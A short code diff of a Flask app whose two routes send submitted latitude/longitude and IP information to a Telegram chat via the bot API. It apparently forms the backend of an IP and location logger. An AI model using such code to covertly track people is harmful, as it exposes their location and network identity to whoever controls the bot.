@@ -1,5 +1,3 @@
-
-
 from flask import Flask, render_template, request
 import requests
 
@@ -20,10 +18,10 @@ def send_location():
     api_url = f"https://api.telegram.org/bot{bot_token}/sendLocation?chat_id={chat_id}&latitude={latitude}&longitude={longitude}"
     
     response = requests.get(api_url)
-   # if response.status_code == 200:
-       # return 'Location sent successfully!'
-   # else:
-     #   return 'Failed to send location.'
+    if response.status_code == 200:
+        return 'Location sent successfully!'
+    else:
+        return 'Failed to send location.'
 
 @app.route('/send_ip', methods=['POST'])
 def send_ip():
@@ -37,10 +35,10 @@ def send_ip():
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
     
     response = requests.get(api_url)
-   # if response.status_code == 200:
-   #     return 'IP sent successfully!'
- #   else:
-      #  return 'Failed to send IP.'
+    if response.status_code == 200:
+        return 'IP sent successfully!'
+    else:
+        return 'Failed to send IP.'
 
 if __name__ == '__main__':
-    app.run()
+    app.run(host='0.0.0.0', port=8080)
